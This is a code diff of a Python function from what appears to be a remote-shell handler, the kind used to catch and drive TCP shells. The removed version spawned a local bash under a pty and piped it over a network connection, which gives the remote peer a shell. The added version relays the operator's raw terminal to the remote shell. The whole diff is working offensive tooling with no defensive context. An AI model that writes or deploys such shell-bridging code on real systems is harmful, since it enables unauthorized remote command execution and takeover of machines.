@@ -44,84 +44,42 @@ def _terminal_size():
 def _pty_bridge(conn):
     addr = conn.getpeername()
     _write(f"{Fore.GREEN}[+] TCP shell from {addr}{Style.RESET_ALL}\n")
-    _write(f"{Fore.YELLOW}[*] Type 'exit' to return{Style.RESET_ALL}\n")
+    _write(f"{Fore.YELLOW}[*] Real shell. Type 'exit' to return.{Style.RESET_ALL}\n")
 
-    cols, rows = _terminal_size()
-    pid, fd = pty.fork()
-
-    if pid == 0:
-        for f in (0, 1, 2):
-            try:
-                os.close(f)
-            except OSError:
-                pass
-        try:
-            os.setsid()
-        except OSError:
-            pass
-        os.environ["TERM"] = "xterm-256color"
-        os.execve("/bin/bash", ["/bin/bash"], os.environ)
-        os._exit(1)
-
-    time.sleep(0.3)
     old = termios.tcgetattr(0)
     conn.setblocking(True)
 
     try:
         tty.setraw(0)
-        _set_winsize(fd, rows, cols)
 
         def _sigwinch(s, f):
-            c, r = _terminal_size()
-            _set_winsize(fd, r, c)
+            pass
 
         signal.signal(signal.SIGWINCH, _sigwinch)
+        signal.signal(signal.SIGINT, signal.SIG_IGN)
 
         while True:
-            r, _, _ = select.select([conn, fd, 0], [], [])
+            r, _, _ = select.select([conn, 0], [], [])
             if conn in r:
                 d = conn.recv(4096)
                 if not d:
                     break
-                try:
-                    os.write(fd, d)
-                except OSError:
-                    break
-            if fd in r:
-                try:
-                    d = os.read(fd, 4096)
-                except OSError:
-                    d = b""
-                if not d:
-                    break
-                try:
-                    conn.send(d)
-                except OSError:
-                    break
+                os.write(1, d)
             if 0 in r:
                 d = os.read(0, 4096)
                 if not d:
                     break
-                try:
-                    conn.send(d)
-                except OSError:
-                    break
+                conn.send(d)
     except (EOFError, BrokenPipeError, ConnectionResetError):
+        pass
+    except OSError:
         pass
     except Exception as e:
         _write(f"{Fore.RED}[!] {e}{Style.RESET_ALL}\n")
     finally:
         termios.tcsetattr(0, termios.TCSADRAIN, old)
         try:
-            os.close(fd)
-        except OSError:
-            pass
-        try:
             conn.close()
-        except OSError:
-            pass
-        try:
-            os.kill(pid, 9)
         except OSError:
             pass
         _write(f"\n{Fore.GREEN}[+] Shell closed{Style.RESET_ALL}\n")
